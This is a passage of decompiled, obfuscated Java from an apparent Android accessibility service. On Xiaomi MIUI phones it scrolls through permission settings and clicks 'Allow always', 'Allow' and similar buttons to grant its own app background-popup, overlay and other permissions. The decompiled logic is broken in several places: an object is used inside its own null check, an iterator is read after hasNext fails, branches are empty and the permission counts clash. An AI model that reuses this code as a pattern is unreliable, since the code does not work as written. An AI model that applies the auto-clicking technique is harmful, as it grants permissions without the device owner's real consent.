                                                                c0367a420.f55109a3.m214207a9(MiuiSteps$FlowType.OVERLAY_PERMISSION);
                                                                c0367a420.m212274d8(str19);
                                                                c0367a420.m212274d8("│ │ │ │ ✅ 权限管理设置完成");
                                                                c0367a420.m212274d8("│ │ │ └─────────────────────────────────────────");
                                                                return t60.m214689a7(true);
                                                            }
                                                            String str25 = str;
                                                            it10 = mapM213614f9.entrySet().iterator();
                                                            i66 = 0;
                                                            while (it10.hasNext()) {
                                                                Map.Entry entry = (Map.Entry) it10.next();
                                                                int i77 = i21;
                                                                String str26 = (String) entry.getKey();
                                                                List list7 = (List) entry.getValue();
                                                                if (linkedHashSet.contains(str26)) {
                                                                    coroutineSingletons5 = coroutineSingletons5;
                                                                    mapM213614f9 = mapM213614f9;
                                                                    miuiSteps$executeBackgroundPopupFlow$1 = miuiSteps$executeBackgroundPopupFlow$1;
                                                                    i21 = i77;
                                                                } else {
                                                                    str7 = str5;
                                                                    str8 = str6;
                                                                    str12 = str25;
                                                                    i67 = i25;
                                                                    int i78 = i77;
                                                                    i69 = i24;
                                                                    int i79 = i22;
                                                                    i34 = 0;
                                                                    miuiSteps$executeBackgroundPopupFlow$15 = miuiSteps$executeBackgroundPopupFlow$1;
                                                                    String str27 = str26;
                                                                    Iterator it15 = list7.iterator();
                                                                    str11 = str2;
                                                                    int i80 = i26;
                                                                    if (!it15.hasNext()) {
                                                                        CoroutineSingletons coroutineSingletons7 = coroutineSingletons5;
                                                                        String str28 = (String) it15.next();
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54344a0 = c0367a411;
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54345a1 = mapM213614f9;
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54346a2 = linkedHashSet;
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54347a3 = it10;
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54348a4 = str27;
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54349a5 = it15;
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54350a6 = str28;
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54351a7 = i78;
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54352a8 = i67;
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54353a9 = i80;
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54354b0 = i79;
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54355b1 = i23;
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54356b2 = i69;
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54357b3 = i66;
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54358b4 = i34;
                                                                        it = it15;
                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54363b9 = 18;
                                                                        objM212263c2 = c0367a411.m212263c2(str28);
                                                                        Map map6 = mapM213614f9;
                                                                        coroutineSingletons = coroutineSingletons7;
                                                                        if (objM212263c2 == coroutineSingletons) {
                                                                            return coroutineSingletons;
                                                                        }
                                                                        int i81 = i69;
                                                                        str9 = str27;
                                                                        c0367a412 = c0367a411;
                                                                        i32 = i79;
                                                                        i30 = i67;
                                                                        map = map6;
                                                                        i31 = i66;
                                                                        i33 = i23;
                                                                        linkedHashSet2 = linkedHashSet;
                                                                        it2 = it10;
                                                                        i28 = i81;
                                                                        int i82 = i80;
                                                                        str10 = str28;
                                                                        i27 = i78;
                                                                        i29 = i82;
                                                                        if (!((Boolean) objM212263c2).booleanValue()) {
                                                                            CoroutineSingletons coroutineSingletons8 = coroutineSingletons;
                                                                            str14 = str8;
                                                                            c0367a412.m212274d8(AbstractC0003a2.m34b5("│ │ │ │ ✅ 找到: ", str10, " (权限组: ", str9, str14));
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54344a0 = c0367a412;
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54345a1 = map;
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54346a2 = linkedHashSet2;
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54347a3 = it2;
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54348a4 = str9;
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54349a5 = null;
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54350a6 = null;
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54351a7 = i27;
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54352a8 = i30;
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54353a9 = i29;
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54354b0 = i32;
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54355b1 = i33;
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54356b2 = i28;
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54357b3 = 1;
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54358b4 = 1;
                                                                            miuiSteps$executeBackgroundPopupFlow$15.f54363b9 = 19;
                                                                            int i83 = i27;
                                                                            int i84 = i32;
                                                                            Iterator it16 = it2;
                                                                            coroutineSingletons2 = coroutineSingletons8;
                                                                            if (c0367a412.m212294f9(2, 100L, 500L, miuiSteps$executeBackgroundPopupFlow$15) != coroutineSingletons2) {
                                                                                C0367a4 c0367a422 = c0367a412;
                                                                                it3 = it16;
                                                                                c0367a413 = c0367a422;
                                                                                i35 = i28;
                                                                                i36 = i33;
                                                                                i37 = i84;
                                                                                i40 = 1;
                                                                                i41 = 1;
                                                                                str13 = str9;
                                                                                i38 = i30;
                                                                                i39 = i83;
                                                                                miuiSteps$executeBackgroundPopupFlow$15.f54344a0 = c0367a413;
                                                                                miuiSteps$executeBackgroundPopupFlow$15.f54345a1 = map;
                                                                                miuiSteps$executeBackgroundPopupFlow$15.f54346a2 = linkedHashSet2;
                                                                                miuiSteps$executeBackgroundPopupFlow$15.f54347a3 = it3;
                                                                                miuiSteps$executeBackgroundPopupFlow$15.f54348a4 = str13;
                                                                                miuiSteps$executeBackgroundPopupFlow$15.f54351a7 = i39;
                                                                                miuiSteps$executeBackgroundPopupFlow$15.f54352a8 = i38;
                                                                                miuiSteps$executeBackgroundPopupFlow$15.f54353a9 = i29;
                                                                                miuiSteps$executeBackgroundPopupFlow$15.f54354b0 = i37;
                                                                                miuiSteps$executeBackgroundPopupFlow$15.f54355b1 = i36;
                                                                                miuiSteps$executeBackgroundPopupFlow$15.f54356b2 = i35;
                                                                                miuiSteps$executeBackgroundPopupFlow$15.f54357b3 = i40;
                                                                                miuiSteps$executeBackgroundPopupFlow$15.f54358b4 = i41;
                                                                                C0367a4 c0367a423 = c0367a413;
                                                                                miuiSteps$executeBackgroundPopupFlow$15.f54363b9 = 20;
                                                                                it4 = it3;
                                                                                int i85 = i40;
                                                                                if (b81.m210571b1(200L, miuiSteps$executeBackgroundPopupFlow$15) != coroutineSingletons2) {
                                                                                    map2 = map;
                                                                                    c0367a414 = c0367a423;
                                                                                    i42 = i37;
                                                                                    i43 = i36;
                                                                                    i44 = i35;
                                                                                    i45 = i85;
                                                                                    linkedHashSet3 = linkedHashSet2;
                                                                                    int i86 = i44;
                                                                                    C0367a4 c0367a424 = c0367a414;
                                                                                    it11 = AbstractC0716jf.m213306g5("始终允许", "Allow always", "允许", "Allow", "仅在使用时允许", "While using the app").iterator();
                                                                                    i71 = i42;
                                                                                    int i87 = i86;
                                                                                    Map map7 = map2;
                                                                                    CoroutineSingletons coroutineSingletons9 = coroutineSingletons2;
                                                                                    Map map8 = map7;
                                                                                    str8 = str14;
                                                                                    str20 = str13;
                                                                                    it7 = it4;
                                                                                    LinkedHashSet linkedHashSet10 = linkedHashSet3;
                                                                                    int i88 = i41;
                                                                                    int i89 = i39;
                                                                                    int i90 = i29;
                                                                                    int i91 = i38;
                                                                                    int i92 = i43;
                                                                                    int i93 = i45;
                                                                                    i73 = 0;
                                                                                    if (it11.hasNext()) {
                                                                                        i52 = i73;
                                                                                        str16 = (String) it11.next();
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54344a0 = c0367a424;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54345a1 = map8;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54346a2 = linkedHashSet10;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54347a3 = it7;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54348a4 = str20;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54349a5 = it11;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54350a6 = str16;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54351a7 = i89;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54352a8 = i91;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54353a9 = i90;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54354b0 = i71;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54355b1 = i92;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54356b2 = i87;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54357b3 = i93;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54358b4 = i88;
                                                                                        it5 = it11;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54359b5 = i52;
                                                                                        miuiSteps$executeBackgroundPopupFlow$15.f54363b9 = 21;
                                                                                        Boolean boolM212263c2 = c0367a424.m212263c2(str16);
                                                                                        LinkedHashSet linkedHashSet11 = linkedHashSet10;
                                                                                        coroutineSingletons3 = coroutineSingletons9;
                                                                                        if (boolM212263c2 == coroutineSingletons3) {
                                                                                            return coroutineSingletons3;
                                                                                        }
                                                                                        obj6 = boolM212263c2;
                                                                                        i54 = i88;
                                                                                        i47 = i89;
                                                                                        i49 = i90;
                                                                                        i46 = i91;
                                                                                        i50 = i71;
                                                                                        i53 = i92;
                                                                                        i48 = i87;
                                                                                        miuiSteps$executeBackgroundPopupFlow$16 = miuiSteps$executeBackgroundPopupFlow$15;
                                                                                        i51 = i93;
                                                                                        c0367a415 = c0367a424;
                                                                                        map3 = map8;
                                                                                        it6 = it7;
                                                                                        str15 = str20;
                                                                                        linkedHashSet4 = linkedHashSet11;
                                                                                        if (((Boolean) obj6).booleanValue()) {
                                                                                            int i94 = i54;
                                                                                            LinkedHashSet linkedHashSet12 = linkedHashSet4;
                                                                                            coroutineSingletons9 = coroutineSingletons3;
                                                                                            str20 = str15;
                                                                                            it7 = it6;
                                                                                            linkedHashSet10 = linkedHashSet12;
                                                                                            map8 = map3;
                                                                                            c0367a424 = c0367a415;
                                                                                            i93 = i51;
                                                                                            miuiSteps$executeBackgroundPopupFlow$15 = miuiSteps$executeBackgroundPopupFlow$16;
                                                                                            i87 = i48;
                                                                                            i92 = i53;
                                                                                            i71 = i50;
                                                                                            i91 = i46;
                                                                                            i90 = i49;
                                                                                            i89 = i47;
                                                                                            it11 = it5;
                                                                                            i73 = i52;
                                                                                            i88 = i94;
                                                                                            if (it11.hasNext()) {
                                                                                                LinkedHashSet linkedHashSet13 = linkedHashSet10;
                                                                                                coroutineSingletons4 = coroutineSingletons9;
                                                                                                int i95 = i90;
                                                                                                map4 = map8;
                                                                                                i61 = i93;
                                                                                                i64 = i89;
                                                                                                i49 = i95;
                                                                                                i60 = i88;
                                                                                                c0367a417 = c0367a424;
                                                                                                i63 = i91;
                                                                                                i70 = i87;
                                                                                                i72 = i92;
                                                                                                linkedHashSet9 = linkedHashSet13;
                                                                                                if (i73 == 0) {
                                                                                                }
                                                                                                linkedHashSet9.add(str20);
                                                                                                int i96 = i72;
                                                                                                i68 = i71;
                                                                                                c0367a417.m212274d8("│ │ │ │   📊 权限组完成: " + str20 + " (已完成: " + linkedHashSet9.size() + "/6)");
                                                                                                if (linkedHashSet9.size() >= 7) {
                                                                                                }
                                                                                            }
                                                                                        } else {
                                                                                            AbstractC0003a2.m45c6("│ │ │ │   ✅ 点击成功: ", str16, c0367a415);
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54344a0 = c0367a415;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54345a1 = map3;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54346a2 = linkedHashSet4;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54347a3 = it6;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54348a4 = str15;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54349a5 = null;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54350a6 = null;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54351a7 = i47;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54352a8 = i46;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54353a9 = i49;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54354b0 = i50;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54355b1 = i53;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54356b2 = i48;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54357b3 = i51;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54358b4 = i54;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54359b5 = 1;
                                                                                            miuiSteps$executeBackgroundPopupFlow$16.f54363b9 = 22;
                                                                                            i58 = i54;
                                                                                            LinkedHashSet linkedHashSet14 = linkedHashSet4;
                                                                                            coroutineSingletons4 = coroutineSingletons3;
                                                                                            if (b81.m210571b1(150L, miuiSteps$executeBackgroundPopupFlow$16) == coroutineSingletons4) {
                                                                                                return coroutineSingletons4;
                                                                                            }
                                                                                            linkedHashSet5 = linkedHashSet14;
                                                                                            c0367a416 = c0367a415;
                                                                                            i55 = i51;
                                                                                            miuiSteps$executeBackgroundPopupFlow$1 = miuiSteps$executeBackgroundPopupFlow$16;
                                                                                            i56 = i53;
                                                                                            i57 = i50;
                                                                                            i59 = 1;
                                                                                            int i97 = i46;
                                                                                            map4 = map3;
                                                                                            i63 = i97;
                                                                                            i71 = i57;
                                                                                            i70 = i48;
                                                                                            linkedHashSet9 = linkedHashSet5;
                                                                                            miuiSteps$executeBackgroundPopupFlow$15 = miuiSteps$executeBackgroundPopupFlow$1;
                                                                                            str20 = str15;
                                                                                            it7 = it6;
                                                                                            i61 = i55;
                                                                                            i73 = i59;
                                                                                            i72 = i56;
                                                                                            i64 = i47;
                                                                                            c0367a417 = c0367a416;
                                                                                            i60 = i58;
                                                                                            if (i73 == 0) {
                                                                                                c0367a417.m212274d8("│ │ │ │   ⚠️ 未找到允许按钮");
                                                                                            }
                                                                                            linkedHashSet9.add(str20);
                                                                                            int i962 = i72;
                                                                                            i68 = i71;
                                                                                            c0367a417.m212274d8("│ │ │ │   📊 权限组完成: " + str20 + " (已完成: " + linkedHashSet9.size() + "/6)");
                                                                                            if (linkedHashSet9.size() >= 7) {
                                                                                                str17 = str12;
                                                                                                c0367a417.m212274d8(str17);
                                                                                                C0367a4 c0367a425 = c0367a417;
                                                                                                i66 = i61;
                                                                                                c0367a411 = c0367a425;
                                                                                                i67 = i63;
                                                                                                linkedHashSet = linkedHashSet9;
                                                                                                i69 = i70;
                                                                                                i26 = i49;
                                                                                                i23 = i962;
                                                                                                i34 = i60;
                                                                                                it10 = it7;
                                                                                                i21 = i64;
                                                                                                if (i34 == 0) {
                                                                                                    i24 = i69;
                                                                                                    map5 = map4;
                                                                                                    i65 = i68;
                                                                                                    i25 = i67;
                                                                                                    int i98 = i26;
                                                                                                    if (linkedHashSet.size() < 7) {
                                                                                                        if (i66 != 0) {
                                                                                                            Map map9 = map5;
                                                                                                            coroutineSingletons5 = coroutineSingletons4;
                                                                                                            mapM213614f9 = map9;
                                                                                                            str = str17;
                                                                                                            miuiSteps$executeBackgroundPopupFlow$1 = miuiSteps$executeBackgroundPopupFlow$15;
                                                                                                            i26 = i98;
                                                                                                            str6 = str8;
                                                                                                            str5 = str7;
                                                                                                        } else {
                                                                                                            if (i24 != 1) {
                                                                                                                str18 = str8;
                                                                                                                str22 = str7;
                                                                                                                int i99 = i23 + 1;
                                                                                                                if (i99 <= i98) {
                                                                                                                    c0367a411.m212274d8(AbstractC0003a2.m31b2("│ │ │ │ 📜 上滑 (", i99, str22, i98, str18));
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54344a0 = c0367a411;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54345a1 = map5;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54346a2 = linkedHashSet;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54347a3 = null;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54348a4 = null;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54349a5 = null;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54350a6 = null;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54351a7 = i21;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54352a8 = i25;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54353a9 = i98;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54354b0 = i65;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54355b1 = i99;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54356b2 = i24;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54363b9 = 27;
                                                                                                                    if (c0367a411.m212282e7(miuiSteps$executeBackgroundPopupFlow$15) == coroutineSingletons4) {
                                                                                                                        return coroutineSingletons4;
                                                                                                                    }
                                                                                                                    i26 = i98;
                                                                                                                    i23 = i99;
                                                                                                                } else {
                                                                                                                    c0367a411.m212274d8("│ │ │ │ ⏹️ 上滑到顶，结束查找");
                                                                                                                }
                                                                                                            } else {
                                                                                                                i65++;
                                                                                                                if (i65 <= i25) {
                                                                                                                    str18 = str8;
                                                                                                                    str22 = str7;
                                                                                                                    c0367a411.m212274d8(AbstractC0003a2.m31b2("│ │ │ │ 📜 下滑 (", i65, str22, i25, str18));
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54344a0 = c0367a411;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54345a1 = map5;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54346a2 = linkedHashSet;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54347a3 = null;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54348a4 = null;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54349a5 = null;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54350a6 = null;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54351a7 = i21;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54352a8 = i25;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54353a9 = i98;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54354b0 = i65;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54355b1 = i23;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54356b2 = i24;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54363b9 = 26;
                                                                                                                    if (c0367a411.m212281e6(miuiSteps$executeBackgroundPopupFlow$15) == coroutineSingletons4) {
                                                                                                                        return coroutineSingletons4;
                                                                                                                    }
                                                                                                                    i26 = i98;
                                                                                                                } else {
                                                                                                                    c0367a411.m212274d8("│ │ │ │ 📜 下滑到底，开始上滑...");
                                                                                                                    Map map10 = map5;
                                                                                                                    coroutineSingletons5 = coroutineSingletons4;
                                                                                                                    mapM213614f9 = map10;
                                                                                                                    str = str17;
                                                                                                                    miuiSteps$executeBackgroundPopupFlow$1 = miuiSteps$executeBackgroundPopupFlow$15;
                                                                                                                    i26 = i98;
                                                                                                                    str5 = str7;
                                                                                                                    str6 = str8;
                                                                                                                    i23 = 0;
                                                                                                                    i24 = 2;
                                                                                                                }
                                                                                                            }
                                                                                                            Map map11 = map5;
                                                                                                            coroutineSingletons5 = coroutineSingletons4;
                                                                                                            mapM213614f9 = map11;
                                                                                                            str = str17;
                                                                                                            miuiSteps$executeBackgroundPopupFlow$1 = miuiSteps$executeBackgroundPopupFlow$15;
                                                                                                            str5 = str22;
                                                                                                            str6 = str18;
                                                                                                        }
                                                                                                        i22 = i65;
                                                                                                        str2 = str11;
                                                                                                        if (linkedHashSet.size() >= 7) {
                                                                                                        }
                                                                                                    } else {
                                                                                                        c0367a411.m212274d8(str17);
                                                                                                    }
                                                                                                    str19 = str11;
                                                                                                    c0367a420 = c0367a411;
                                                                                                    c0367a420.m212274d8(str19);
                                                                                                    c0367a420.m212274d8("│ │ │ │ 📊 权限设置结果: " + linkedHashSet.size() + "/7 (7个唯一权限)");
                                                                                                    StringBuilder sb2 = new StringBuilder("│ │ │ │   完成的权限组: ");
                                                                                                    sb2.append(linkedHashSet);
                                                                                                    c0367a420.m212274d8(sb2.toString());
                                                                                                    Set setKeySet2 = map5.keySet();
                                                                                                    arrayList = new ArrayList();
                                                                                                    while (r0.hasNext()) {
                                                                                                    }
                                                                                                    if (!arrayList.isEmpty()) {
                                                                                                    }
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54344a0 = c0367a420;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54345a1 = null;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54346a2 = null;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54347a3 = null;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54348a4 = null;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54349a5 = null;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54350a6 = null;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54363b9 = 28;
                                                                                                    if (b81.m210571b1(150L, miuiSteps$executeBackgroundPopupFlow$15) == coroutineSingletons4) {
                                                                                                    }
                                                                                                    c0367a420.f55109a3.m214207a9(MiuiSteps$FlowType.BACKGROUND_POPUP);
                                                                                                    c0367a420.f55109a3.m214207a9(MiuiSteps$FlowType.OVERLAY_PERMISSION);
                                                                                                    c0367a420.m212274d8(str19);
                                                                                                    c0367a420.m212274d8("│ │ │ │ ✅ 权限管理设置完成");
                                                                                                    c0367a420.m212274d8("│ │ │ └─────────────────────────────────────────");
                                                                                                    return t60.m214689a7(true);
                                                                                                }
                                                                                                coroutineSingletons5 = coroutineSingletons4;
                                                                                                str25 = str17;
                                                                                                miuiSteps$executeBackgroundPopupFlow$1 = miuiSteps$executeBackgroundPopupFlow$15;
                                                                                                i24 = i69;
                                                                                                mapM213614f9 = map4;
                                                                                                str2 = str11;
                                                                                                i22 = i68;
                                                                                                str6 = str8;
                                                                                                i25 = i67;
                                                                                                str5 = str7;
                                                                                                while (it10.hasNext()) {
                                                                                                }
                                                                                            } else {
                                                                                                str17 = str12;
                                                                                                if (i64 != 0) {
                                                                                                    c0367a417.m212274d8("│ │ │ │   📱 [Android 9及以下] 跳过返回操作");
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54344a0 = c0367a417;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54345a1 = map4;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54346a2 = linkedHashSet9;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54347a3 = it7;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54348a4 = null;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54349a5 = null;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54350a6 = null;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54351a7 = i64;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54352a8 = i63;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54353a9 = i49;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54354b0 = i61;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54355b1 = i60;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54363b9 = 23;
                                                                                                    if (b81.m210571b1(300L, miuiSteps$executeBackgroundPopupFlow$15) == coroutineSingletons4) {
                                                                                                        return coroutineSingletons4;
                                                                                                    }
                                                                                                    i62 = i49;
                                                                                                    linkedHashSet8 = linkedHashSet9;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17 = miuiSteps$executeBackgroundPopupFlow$15;
                                                                                                    Map map12 = map4;
                                                                                                    c0367a419 = c0367a417;
                                                                                                    LinkedHashSet linkedHashSet15 = linkedHashSet8;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54344a0 = c0367a419;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54345a1 = map12;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54346a2 = linkedHashSet15;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54347a3 = it7;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54351a7 = i64;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54352a8 = i63;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54353a9 = i62;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54354b0 = i61;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54355b1 = i60;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$17.f54363b9 = 25;
                                                                                                    if (c0367a419.m212294f9(2, 100L, 500L, miuiSteps$executeBackgroundPopupFlow$17) != coroutineSingletons4) {
                                                                                                        return coroutineSingletons4;
                                                                                                    }
                                                                                                    linkedHashSet7 = linkedHashSet15;
                                                                                                    map4 = map12;
                                                                                                    c0367a418 = c0367a419;
                                                                                                    it8 = it7;
                                                                                                    C0367a4 c0367a426 = c0367a418;
                                                                                                    i66 = i61;
                                                                                                    c0367a411 = c0367a426;
                                                                                                    MiuiSteps$executeBackgroundPopupFlow$1 miuiSteps$executeBackgroundPopupFlow$18 = miuiSteps$executeBackgroundPopupFlow$17;
                                                                                                    it10 = it8;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15 = miuiSteps$executeBackgroundPopupFlow$18;
                                                                                                    i26 = i62;
                                                                                                    i67 = i63;
                                                                                                    linkedHashSet = linkedHashSet7;
                                                                                                    i23 = 0;
                                                                                                    i68 = 0;
                                                                                                    i69 = 1;
                                                                                                    i34 = i60;
                                                                                                    i21 = i64;
                                                                                                    if (i34 == 0) {
                                                                                                    }
                                                                                                } else {
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54344a0 = c0367a417;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54345a1 = map4;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54346a2 = linkedHashSet9;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54347a3 = it7;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54348a4 = null;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54349a5 = null;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54350a6 = null;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54351a7 = i64;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54352a8 = i63;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54353a9 = i49;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54354b0 = i61;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54355b1 = i60;
                                                                                                    miuiSteps$executeBackgroundPopupFlow$15.f54363b9 = 24;
                                                                                                    if (b81.m210571b1(500L, miuiSteps$executeBackgroundPopupFlow$15) == coroutineSingletons4) {
                                                                                                        return coroutineSingletons4;
                                                                                                    }
                                                                                                    i62 = i49;
                                                                                                    linkedHashSet6 = linkedHashSet9;
                                                                                                    try {
                                                                                                    } catch (Exception unused) {
                                                                                                        rootInActiveWindow2 = null;
                                                                                                    }
                                                                                                    rootInActiveWindow2 = c0367a417.f55106a0.getRootInActiveWindow();
                                                                                                    if (rootInActiveWindow2 == null) {
                                                                                                        Iterator it17 = AbstractC0716jf.m213306g5("始终允许", "允许", "仅在使用时允许", "Allow always", "Allow", "While using the app").iterator();
                                                                                                        while (true) {
                                                                                                            if (it17.hasNext()) {
                                                                                                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow2.findAccessibilityNodeInfosByText((String) it17.next());
                                                                                                                if (listFindAccessibilityNodeInfosByText2 == null) {
                                                                                                                    it9 = it7;
                                                                                                                } else {
                                                                                                                    if (!listFindAccessibilityNodeInfosByText2.isEmpty()) {
                                                                                                                        Iterator it18 = listFindAccessibilityNodeInfosByText2.iterator();
                                                                                                                        while (it18.hasNext()) {
                                                                                                                            if (((AccessibilityNodeInfo) it18.next()).isVisibleToUser()) {
                                                                                                                                it9 = it7;
                                                                                                                                z4 = true;
                                                                                                                                z5 = true;
                                                                                                                                z3 = z5 != z4;
                                                                                                                                if (z3) {
                                                                                                                                    t60.m214694b5(listFindAccessibilityNodeInfosByText2, "nodes");
                                                                                                                                    Iterator it19 = listFindAccessibilityNodeInfosByText2.iterator();
                                                                                                                                    while (it19.hasNext()) {
                                                                                                                                        ((AccessibilityNodeInfo) it19.next()).recycle();
                                                                                                                                    }
                                                                                                                                    z2 = true;
                                                                                                                                } else {
                                                                                                                                    if (listFindAccessibilityNodeInfosByText2 != null) {
                                                                                                                                        Iterator it20 = listFindAccessibilityNodeInfosByText2.iterator();
                                                                                                                                        while (it20.hasNext()) {
